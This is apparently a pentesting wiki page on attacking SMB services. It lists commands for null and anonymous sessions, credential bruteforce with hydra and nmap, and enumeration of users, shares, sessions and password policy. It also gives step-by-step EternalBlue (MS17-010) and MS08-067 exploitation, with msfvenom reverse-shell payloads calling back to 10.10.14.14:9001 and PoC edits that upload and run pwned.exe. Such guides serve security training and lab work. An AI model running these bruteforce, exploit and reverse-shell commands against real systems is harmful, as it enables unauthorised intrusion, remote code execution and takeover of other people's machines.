---
description: Pentesting SMB - TCP Ports 445,139
---

# SMB

## Theory

The Server Message Block Protocol (SMB Protocol) is a client-server communication protocol used for sharing access to files, printers, serial ports, and data on a network. It can also carry transaction protocols for authenticated inter-process communication.

SMB protocol operate on different ports depending on the type of communication:

* **Port 445 (TCP)**: This port is used for direct SMB communication over TCP/IP, including file and printer sharing, remote administration, and inter-process communication.
* **Port 139 (TCP)**: This port is used for SMB over [NetBIOS](nbt-ns-netbios.md), which is an underlying protocol that SMB relies on for name resolution and session establishment.

## Practice

### Authentication

{% tabs %}
{% tab title="Null session" %}
`Null session` refers to an unauthenticated session established with an SMB server where the client does not provide any credentials.

```bash
#SmbClient
smbclient -U '' -N -L '\\<IP>\'

#NetExec
netexec smb <IP> -u '' -p '' --shares
```
{% endtab %}

{% tab title="Anonymous logon" %}
The inclusion of `Anonymous` and `Everyone` access group in the `pre-Windows 2000 compatible` access group allow us to make an anonymous connection over SMB. Using a random username and password you can check if the target accepts annonymous/guest logon

```bash
#SmbClient
smbclient -N -L '\\<IP>\'
smbclient -U 'a' -N -L '\\<IP>\'

#NetExec
netexec smb <IP> -u 'a' -p '' --shares
```
{% endtab %}

{% tab title="Bruteforce" %}
Tools like [hydra](https://github.com/vanhauser-thc/thc-hydra) or [nmap](https://github.com/nmap/nmap) can be used to operate authentication bruteforce attacks.

```bash
# hydra
hydra -L usernames.txt -P passwords.txt <IP> -V -f smb

# nmap
nmap --script smb-brute -p 445 <IP>
```
{% endtab %}
{% endtabs %}

### Enumerate

{% hint style="info" %}
Using [nmap](https://github.com/nmap/nmap), we can enumerate sessions/shares/users/domains/groups at one time using the following command :

`nmap --script="smb-enum*" -p 445 <IP>`
{% endhint %}

#### Version & Configuration

{% tabs %}
{% tab title="NetExec" %}
Tools like [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to enumerate supported protocols, dialects and signing configuration of SMB.

```bash
#Enum host with SMB signing not required
netexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt

#Simply fingerprint SMB versipn
netexec smb <TARGET>
```
{% endtab %}

{% tab title="Nmap" %}
Tools like [nmap](https://github.com/nmap/nmap) can be used to enumerate supported protocols, dialects and signing configuration of SMB.

```bash
#list the supported protocols and dialects of a SMB server. 
nmap --script="smb-protocols" -p 445 <IP>

#Determines the message signing configuration
nmap --script="smb-security-mode" -p 445 <IP>

#Enum host with SMB signing not required
nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 192.168.1.0/24
```
{% endtab %}
{% endtabs %}

#### Users

{% tabs %}
{% tab title="NetExec" %}
[NetExec](https://github.com/Pennyw0rth/NetExec) can be used to enumerate users over SMB.

```bash
# Enumerate domain users over \pipe\samr 
netexec smb <TARGET> -u <USER> -p <PASSWORD> --users

# Enumerate local users over \pipe\samr 
netexec smb <TARGET> -u <USER> -p <PASSWORD> --local-users

#Brute force RID using querydispinfo over \pipe\samr 
netexec smb <TARGET> -u <USER> -p <PASSWORD> --rid-brute 5000
```
{% endtab %}

{% tab title="Nmap" %}
[nmap](https://github.com/nmap/nmap)'s [smb-enum-users ](https://nmap.org/nsedoc/scripts/smb-enum-users.html)can be used to enumerate users over SMB.

```bash
#Try to enumerate users over SMB with null/anonymous session
nmap --script="smb-enum-users" -p 445 <IP>

#Or enumerate with a valide session
nmap --script="smb-enum-users" --script-args smbusername=administrator,smbpassword=mypassword_1 -p 445 <IP>
```
{% endtab %}
{% endtabs %}

#### Groups

{% tabs %}
{% tab title="NetExec" %}
[NetExec](https://github.com/Pennyw0rth/NetExec) can be used to enumerate groups over SMB.

```bash
# Enumerate domain groups over \pipe\samr 
netexec smb <TARGET> -u <USER> -p <PASSWORD> --groups

#Enum local groups over \pipe\samr
netexec smb $IP -u $USER -p $PASS --local-group

#Brute force RID using querydispinfo over \pipe\samr 
netexec smb <TARGET> -u <USER> -p <PASSWORD> --rid-brute 5000
```
{% endtab %}

{% tab title="Nmap" %}
[nmap](https://github.com/nmap/nmap)'s [smb-enum-groups](https://nmap.org/nsedoc/scripts/smb-enum-groups.html) can be used to enumerate groups over SMB.

```bash
#Try to enumerate groups over SMB with null/anonymous session
nmap --script="smb-enum-groups" -p 445 <IP>

#Or enumerate with a valide session
nmap --script="smb-enum-groups" --script-args smbusername=administrator,smbpassword=mypassword_1 -p 445 <IP>
```
{% endtab %}
{% endtabs %}

#### Shares

{% tabs %}
{% tab title="SMBClient" %}
SMBClient is a native tool that allow us to interact with SMB shares. We can use it to list shares as follow

```bash
smbclient -U <USER> -L '\\<IP>\'
```
{% endtab %}

{% tab title="NetExec" %}
[NetExec](https://github.com/Pennyw0rth/NetExec) can be used to enumerate SMB shares.

```bash
netexec smb <TARGET> -u <USER> -p <PASSWORD> --shares
```
{% endtab %}

{% tab title="Nmap" %}
[nmap](https://github.com/nmap/nmap)'s [smb-enum-shares](https://nmap.org/nsedoc/scripts/smb-enum-shares.html) can be used to enumerate groups over SMB.

```bash
#Try to enumerate SMB shares with null/anonymous session
nmap --script="smb-enum-shares" -p 445 <IP>

#Or enumerate with a valide session
nmap --script="smb-enum-shares" --script-args smbusername=administrator,smbpassword=mypassword_1 -p 445 <IP>
```
{% endtab %}

{% tab title="Net" %}
One useful tool for enumerating SMB shares from a Windows host is [net view](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875576\(v=ws.11\)).

```powershell
net view \\<COMPUTER_NAME> /all
```
{% endtab %}
{% endtabs %}

#### ACLs of Share's File/Folder

{% tabs %}
{% tab title="Smbcacls" %}
The smbcacls program allow us to get ACLs on an NT file or directory on a SMB file shares.

```bash
#File/Folder permission with anonymous/guest login (remove -N for password prompt)
smbcacls -U <USER> -N '\\<IP>\<SHARE>' <FILE/FOLDER Name>
```

If you see a lot off files and folders, the following commands will make a recursive permissions check on each item

```bash
#Mount the Share locally
sudo mount -t cifs -o username='USER',password='PASSWORD' '\\<IP>\<SHARE>' /mnt/Share

#Get all items
find /mnt/Share|sed 's|/mnt/Share/||g' > smb_items.txt

#Get all ACLs
for i in $(cat smb_items.txt); do echo $i; smbcacls -N '\\10.10.10.103\Department Shares' $i; echo ; done > smb_acls.txt
```
{% endtab %}
{% endtabs %}

#### Sessions

{% tabs %}
{% tab title="NetExec" %}
[NetExec](https://github.com/Pennyw0rth/NetExec) can be used to enumerate active sessions and logged in users over SMB.

```bash
#Enumerate active sessions
netexec smb <TARGET> -u <USER> -p <PASSWORD> --sessions

#Enumerate logged-on in users
netexec smb <TARGET> -u <USER> -p <PASSWORD> --loggedon-users
```
{% endtab %}

{% tab title="Nmap" %}
[nmap](https://github.com/nmap/nmap)'s [smb-enum-sessions](https://nmap.org/nsedoc/scripts/smb-enum-sessions.html) can be used to enumerate active sessions over SMB.

```bash
#Try to enumerate groups over SMB with null/anonymous session
nmap --script="smb-enum-sessions" -p 445 <IP>

#Or enumerate with a valide session
nmap --script="smb-enum-sessions" --script-args smbusername=administrator,smbpassword=mypassword_1 -p 445 <IP>
```
{% endtab %}
{% endtabs %}

#### Password Policy

{% tabs %}
{% tab title="NetExec" %}
[NetExec](https://github.com/Pennyw0rth/NetExec) can be used to enumerate various objects over SMB like the domain password policy.

```bash
#Enumerate the password policy
netexec smb <TARGET> -u <USER> -p <PASSWORD> --pass-pol
```
{% endtab %}
{% endtabs %}

### Execute Remote Commands

{% content-ref url="../../redteam/pivoting/smb-based.md" %}
[smb-based.md](../../redteam/pivoting/smb-based.md)
{% endcontent-ref %}

### Vulnerabilities

{% hint style="info" %}
You may use nmap to scan target for SMB vulnerabilities

```
sudo nmap -p 445 --script="smb-vuln-*" <IP>
```
{% endhint %}

#### EternalBlue - MS17-010

Eternalblue is a flaw that allows remote attackers to execute arbitrary code on a target system by sending specially crafted messages to the SMBv1 server.&#x20;

{% hint style="info" %}
**Windows Vista, Windows 7, Windows 8.1, Windows 10, Windows Server 2008, Windows Server 2012 et Windows Server 2016** versions using **SMBv1** are likely vulnerable if not patched.
{% endhint %}

{% tabs %}
{% tab title="Enumerate" %}
Tools like [nmap](https://github.com/nmap/nmap) can be used to detect the presence of the EternalBlue vulnerability.

```bash
sudo nmap -p 445 --script="smb-vuln-ms17-010" <IP>
```

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to check if the target is vulnerable to MS17-010.

```bash
netexec smb <IP> -u <USER> -p <PASSWORD> -M ms17-010
```
{% endtab %}

{% tab title="Exploit - worawit" %}
To exploit, we may use the Worawit [PoC](https://github.com/worawit/MS17-010) on GitHub

* first, we have to edit `USERNAME` and `PASSWORD` at the begening of the `zzz_exploit.py` script.
* Second, generate a reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=9001 EXITFUNC=thread -f exe -a x86 --platform windows -o pwned.exe
```

* Third, we have to edit , he `smb_pwn` function in `zzz_exploit.py`. This is the action taken with the exploit.

```bash
smb_send_file(smbConn, '/home/v4resk/Documents/www/pwned.exe', 'C', '/pwned.exe')
service_exec(conn, r'cmd /c c:\\pwned.exe')
```

* Fourth, trigger the exploit

```bash
#Exploit
python2.7 zzz_exploit.py <IP>

#Exploit on ntsvcs named pipe
python2.7 zzz_exploit.py <IP> ntsvcs
```
{% endtab %}

{% tab title="Exploit - helviojunior" %}
To exploit, we may use the helviojunior [PoC](https://github.com/helviojunior/MS17-010) on GitHub. He forked the worawit repo and added a single `send_and_execute.py`, which is really handy.

* First, we have to edit `USERNAME` and `PASSWORD` at the begening of the `send_and_execute.py` script
* Second, generate a reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=9001 EXITFUNC=thread -f exe -a x86 --platform windows -o pwned.exe
```

* Third, trigger the exploit

```bash
#Exploit
python2.7 send_and_execute.py <IP> pwned.exe

#Exploit on ntsvcs named pipe
python2.7 send_and_execute.py <IP> pwned.exe ntsvcs
```
{% endtab %}
{% endtabs %}

#### MS08-067

The MS08-067 vulnerability is a buffer overflow vulnerability in the Windows Server service.The vulnerability could allow remote code execution if an affected system received a specially crafted RPC request. On Microsoft Windows 2000, Windows XP, and Windows Server 2003 systems, an attacker could exploit this vulnerability without authentication to run arbitrary code.

{% tabs %}
{% tab title="Enumerate" %}
Tools like [nmap](https://github.com/nmap/nmap) can be used to to detect the presence of the MS08-067 vulnerability.

```bash
sudo nmap -p 445 --script="smb-vuln-ms08-067" <IP>
```
{% endtab %}

{% tab title="Exploit" %}
To exploit, we may use the jivoi [PoC](https://raw.githubusercontent.com/jivoi/pentest/master/exploit\_win/ms08-067.py) on GitHub.

* First, generate a Python shellcode and utilize it to replace the current one in `ms08-067.py`.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=9001 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

* Second, we have to guess version of windows and language pack. The exploit takes advantage of knowing where some little bits of code will be in memory, and uses those bits on the path to shell.
* Third, trigget the exploit

```bash
#6 is for Windows XP SP3 English (NX)
python ms08-067.py 10.10.10.4 6 445

#4 is for Windows 2003 SP1 English
python ms08-067.py 10.10.10.4 4 445
```
{% endtab %}
{% endtabs %}

## Exfiltration

{% content-ref url="../../redteam/exfiltration/smb.md" %}
[smb.md](../../redteam/exfiltration/smb.md)
{% endcontent-ref %}

## Resources

{% embed url="https://0xdf.gitlab.io/2019/02/21/htb-legacy.html" %}
